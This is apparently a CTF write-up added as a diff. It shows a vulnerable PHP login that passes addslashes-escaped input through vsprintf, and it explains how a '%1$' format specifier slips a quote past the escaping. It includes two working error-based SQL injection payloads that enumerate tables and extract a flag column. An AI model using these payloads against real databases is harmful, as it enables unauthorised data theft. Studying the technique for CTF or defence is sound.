@@ -1,0 +1,41 @@
+ <?php require 'config.php';
+
+class db extends Connection {
+    public function query($sql) {
+        $args = func_get_args();
+        unset($args[0]);
+        return parent::query(vsprintf($sql, $args));
+    }
+}
+
+$db = new db();
+
+if (isset($_POST['pass'])) {
+    $pass = addslashes($_POST['pass']);
+    $db->query("SELECT * FROM users WHERE password=('$pass') AND username=('%s')", 'admin');
+} else {
+    die(highlight_file(__FILE__,1));
+}
+
+in this challenge we use the format string declration to trick the parser to insert sql queries
+
+addslashes function jsut escapes ' \ etc
+
+the $pass value is intrepreted by vsprintf--> which workd like format in python just replace the % with the respective values
+
+vsprintf("%s : %s ",['test','test']);
+
+to add a custom index number, we use %index\$, 
+to add custom variable we use %index$var_name
+
+thus we use that var_name position to insert any sql code which will sent to the back end
+
+ %1$%27)+union+select+extractvalue(rand(),concat(0x3a,(SELECT+concat(CHAR(126),TABLE_NAME,CHAR(126))+FROM+information_schema.TABLES+LIMIT+160,1)))--+-
+find the table name containing the flag
+
+%1$%27)+union+select+extractvalue(rand(),concat(0x3a,(SELECT+concat(CHAR(126),flag,CHAR(126))+FROM+totally_not_a_flag)))--+-
+
+just guess that column name as flag
+
+this bypass worked because anything '$' is interperted as a var thus didnt get escaped thus allowing us to break out of the sql statment
+
